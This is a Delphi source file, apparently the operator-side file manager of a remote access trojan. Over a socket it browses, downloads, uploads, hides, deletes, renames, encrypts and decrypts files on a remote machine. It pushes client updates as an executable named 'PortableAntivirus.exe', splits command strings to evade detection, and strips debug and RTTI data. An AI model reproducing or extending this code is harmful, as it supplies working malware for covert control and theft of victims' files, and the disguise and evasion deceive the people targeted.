unit File_Manager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, ImgList, Menus, ScktComp, ExtCtrls;

type
  TForm3 = class(TForm)
    ListView1: TListView;
    Edit1: TEdit;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    BaixarArquivo1: TMenuItem;
    EnviarArquivo1: TMenuItem;
    SaveDialog1: TSaveDialog;
    OpenDialog1: TOpenDialog;
    Panel1: TPanel;
    Label1: TLabel;
    ProgressBar1: TProgressBar;
    ProgressBar2: TProgressBar;
    Label2: TLabel;
    Timer1: TTimer;
    Atualizar1: TMenuItem;
    N1: TMenuItem;
    OcultarArquivo: TMenuItem;
    Deletar1: TMenuItem;
    CriarPasta: TMenuItem;
    N2: TMenuItem;
    Renomear: TMenuItem;
    AtualizarCliente1: TMenuItem;
    compress: TMenuItem;
    Criptografar1: TMenuItem;
    Descriptografar1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure Edit1KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure ListView1DblClick(Sender: TObject);
    procedure BaixarArquivo1Click(Sender: TObject);
    procedure EnviarArquivo1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Atualizar1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure OcultarArquivoClick(Sender: TObject);
    procedure Deletar1Click(Sender: TObject);
    procedure CriarPastaClick(Sender: TObject);
    procedure RenomearClick(Sender: TObject);
    procedure ListView1KeyPress(Sender: TObject; var Key: Char);
    procedure AtualizarCliente1Click(Sender: TObject);
    procedure compressClick(Sender: TObject);
    procedure Criptografar1Click(Sender: TObject);
    procedure Descriptografar1Click(Sender: TObject);
  private
    { Private declarations }
  public
    Socket: TCustomWinSocket;
    LocalSalvar: String;
    ArquivoEnviar: TMemoryStream;
    { Public declarations }
  end;

var
  Form3: TForm3;

implementation

uses Principal;

{$R *.dfm}
{$SETPEFlAGS IMAGE_FILE_DEBUG_STRIPPED or IMAGE_FILE_LINE_NUMS_STRIPPED or
 IMAGE_FILE_LOCAL_SYMS_STRIPPED OR IMAGE_FILE_RELOCS_STRIPPED}

{$WEAKLINKRTTI ON}
{$RTTI EXPLICIT METHODS([]) PROPERTIES([]) FIELDS([])}

procedure TForm3.FormCreate(Sender: TObject);
begin
  Edit1.Align := alTop;
  ListView1.Align := alClient;
end;

procedure TForm3.PopupMenu1Popup(Sender: TObject);
begin
  if ListView1.ItemIndex < 0 then
  begin
    PopupMenu1.Items[2].Enabled := false;
    exit;
  end;
  if ListView1.Selected.SubItems[0] <> 'Pasta' then
    PopupMenu1.Items[2].Enabled := True
  else
    PopupMenu1.Items[2].Enabled := False;

  if ListView1.Selected.ImageIndex > 1 then
    PopupMenu1.Items[5].Caption := 'Mostrar'
  else
    if PopupMenu1.Items[5].Caption <> 'Ocultar' then
      PopupMenu1.Items[5].Caption := 'Ocultar';

  if ListView1.Selected.SubItems[0] = 'WinZip' then
    PopupMenu1.Items[7].Caption := 'Descomprimir'
  else
    if PopupMenu1.Items[7].Caption <> 'Comprimir' then
      PopupMenu1.Items[7].Caption := 'Comprimir';
  if ListView1.Selected.SubItems[0] = 'WinRar' then
    PopupMenu1.Items[7].Enabled:=False
  else
    PopupMenu1.Items[7].Enabled:=True;
end;

procedure TForm3.Edit1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin

  try
    if Key = VK_RETURN then
    begin
      Socket.SendText('<|Fold|>' + Edit1.Text + '<<|');
    end
  except
    exit;
  end;
end;

procedure TForm3.ListView1DblClick(Sender: TObject);
begin
  if ListView1.Selected.SubItems[0] <> 'Pasta' then Exit;
  if ListView1.Selected.Caption = '..' then
  begin
    Edit1.Text := ExtractFilePath(Copy(Edit1.Text, 1, Length(Edit1.Text) - 1));
    Socket.SendText('<|Fold|>' + Edit1.Text + '<<|')
  end
  else
  begin
    if Copy(Edit1.Text, Length(Edit1.Text), Length(Edit1.Text)) = '\' then
    else
      Edit1.Text := Edit1.Text + '\';

    Edit1.Text := Edit1.Text + ListView1.Selected.Caption + '\';
    Socket.SendText('<|Fold|>' + Edit1.Text + '<<|');
  end;
end;

procedure TForm3.ListView1KeyPress(Sender: TObject; var Key: Char);
begin
  if Ord(Key) = VK_RETURN then begin
    Key := #0;
    if ListView1.Selected.SubItems[0] <> 'Pasta' then exit;
    if ListView1.Selected.Caption = '..' then begin
      Edit1.Text := ExtractFilePath(Copy(Edit1.Text, 1, Length(Edit1.Text) - 1));
      Socket.SendText('<|Fold|>' + Edit1.Text + '<<|')
    end else begin
      if Copy(Edit1.Text, Length(Edit1.Text), Length(Edit1.Text)) = '\' then else
        Edit1.Text := Edit1.Text + '\';
      Edit1.Text := Edit1.Text + ListView1.Selected.Caption + '\';
      Socket.SendText('<|Fold|>' + Edit1.Text + '<<|');
    end;
  end;
 if Ord(Key) = VK_BACK then begin
    Edit1.Text := ExtractFilePath(Copy(Edit1.Text, 1, Length(Edit1.Text) - 1));
    Socket.SendText('<|Fold|>' + Edit1.Text + '<<|')
 end;
end;

procedure TForm3.OcultarArquivoClick(Sender: TObject);
begin
if OcultarArquivo.Caption.Equals('&Ocultar') then
  Socket.SendText('<|OcultarFiles|>' + Edit1.Text + '\' + ListView1.Selected.Caption + '<<|')
else
  Socket.SendText('<|MostrarFiles|>' + Edit1.Text + '\' + ListView1.Selected.Caption + '<<|');
Atualizar1.Click;
end;

procedure TForm3.AtualizarCliente1Click(Sender: TObject);
begin
  OpenDialog1.Filter:='PortableAntivirus.exe|PortableAntivirus.exe|Executável|*.exe';
  if Copy(Edit1.Text, Length(Edit1.Text), Length(Edit1.Text)) = '\' then
  else
    Edit1.Text := Edit1.Text + '\';
  if OpenDialog1.Execute then
  begin
    ArquivoEnviar := TMemoryStream.Create;
    ArquivoEnviar.LoadFromFile(OpenDialog1.FileName);
    Socket.SendText('<|AtualizarC|>' +ExtractFileName(OpenDialog1.FileName) + '<<|');
  end;
  OpenDialog1.Filter:='Todos os Arquivos|*.*';
end;

procedure TForm3.BaixarArquivo1Click(Sender: TObject);
begin
  SaveDialog1.Filter := 'Arquivo ' + ExtractFileExt(ListView1.Selected.Caption)
    + '|*' + ExtractFileExt(ListView1.Selected.Caption);
  if SaveDialog1.Execute then
  begin
    LocalSalvar := SaveDialog1.FileName +
    ExtractFileExt(ListView1.Selected.Caption);
    Socket.SendText('<|ar'+'qbai'+'xad'+'ado|>' + Edit1.Text + '\' + ListView1.Selected.Caption + '<<|');
  end;
end;

procedure TForm3.compressClick(Sender: TObject);
begin
  if(compress.Caption.Equals('Co&mprimir'))then
    Socket.SendText('<|compress|>'+Edit1.Text+ListView1.Selected.Caption+'<<|')
  else
    Socket.SendText('<|descompress|>'+Edit1.Text+','+ListView1.Selected.Caption +'<<|');
Atualizar1.Click;
end;

procedure TForm3.CriarPastaClick(Sender: TObject);
var newName:String;
begin
  newName:=InputBox('Nova pasta','Digite o Nome','');
  if(newName<>'')then
    Socket.SendText('<|CriaNewPasta|>' + Edit1.Text + '\' + newName+ '<<|');
end;

procedure TForm3.Criptografar1Click(Sender: TObject);
begin
  Socket.SendText('<|crypt|>'+Edit1.Text+ListView1.Selected.Caption+'<<|');
end;

procedure TForm3.RenomearClick(Sender: TObject);
var newName:String;
begin
  newName:=InputBox('Renomear','Novo nome','');
  if(newName<>'')then
    Socket.SendText('<|RenomearFile|>' + Edit1.Text + '\' + ListView1.Selected.Caption +'###'+newName+'<<|');
end;

procedure TForm3.Deletar1Click(Sender: TObject);
begin
Socket.SendText('<|DeletarFiles|>' + Edit1.Text + '\' + ListView1.Selected.Caption + '<<|');
end;

procedure TForm3.Descriptografar1Click(Sender: TObject);
begin
  Socket.SendText('<|decrypt|>'+Edit1.Text+ListView1.Selected.Caption+'<<|');
end;

procedure TForm3.EnviarArquivo1Click(Sender: TObject);
begin
  if Copy(Edit1.Text, Length(Edit1.Text), Length(Edit1.Text)) = '\' then
  else
    Edit1.Text := Edit1.Text + '\';

  if OpenDialog1.Execute then
  begin
    ArquivoEnviar := TMemoryStream.Create;
    ArquivoEnviar.LoadFromFile(OpenDialog1.FileName);
    Socket.SendText('<|upa'+'ren'+'via'+'f|>' + Edit1.Text + '\' + ExtractFileName(OpenDialog1.FileName) + '<<|');
  end;
end;

procedure TForm3.Timer1Timer(Sender: TObject);
begin
  try
    ProgressBar2.Position := ArquivoEnviar.Position;
//    if(ProgressBar2.Position=100)then begin
  //    ArquivoEnviar.Clear;
    //end;
  except
    ProgressBar2.Position := 0;
//    ArquivoEnviar.Clear;
    Timer1.Enabled := false;
  end;
end;

procedure TForm3.Atualizar1Click(Sender: TObject);
begin
  try
    Socket.SendText('<|Fold|>' + Edit1.Text + '<<|');
  except
    exit;
  end;
end;

procedure TForm3.FormClose(Sender: TObject; var Action: TCloseAction);
var
  L: TListItem;
begin
  L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
  begin
    L.SubItems.Objects[4] := nil;
  end;
  Destroy;
end;

end.
